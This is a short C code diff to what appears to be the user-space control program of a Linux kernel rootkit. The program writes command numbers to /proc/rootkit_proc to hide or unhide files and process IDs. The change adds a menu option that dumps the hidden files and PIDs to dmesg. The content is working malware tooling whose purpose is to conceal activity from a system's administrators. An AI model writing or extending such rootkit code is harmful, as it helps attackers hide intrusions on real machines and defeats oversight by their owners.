@@ -13,6 +13,7 @@ void display_intro(void){
 	printf("\t2. Unhide file\n");
 	printf("\t3. Hide PID\n");
 	printf("\t4. Unhide PID\n");
+	printf("\t5. See hidden files/PIDs\n");
 }
 
 int get_option(void){
@@ -20,7 +21,7 @@ int get_option(void){
 	do{
 		printf("Select an option: ");
 		c = fgetc(stdin);
-	} while (c < '1' || c > '4');
+	} while (c < '1' || c > '5');
 	return c - '0';
 }
 
@@ -70,6 +71,13 @@ void unhide_pid(int fd){
 	printf("PID unhidden successfully!\n");
 }
 
+void see_hidden(int fd){
+	int id = 5;
+	if (write(fd, &id, sizeof(id)) != sizeof(id))
+		printf("ERROR WRITE\n");
+	printf("Hidden files and PIDs shown in dmesg\n");
+}
+
 int main(int argc, char** argv){
 	int fd;
 	if ((fd = open("/proc/rootkit_proc", O_WRONLY)) == -1){
@@ -93,6 +101,9 @@ int main(int argc, char** argv){
 				break;
 			case 4:
 				unhide_pid(fd);
+				break;
+			case 5:
+				see_hidden(fd);
 				break;
 			default:
 				printf("NANI\n");
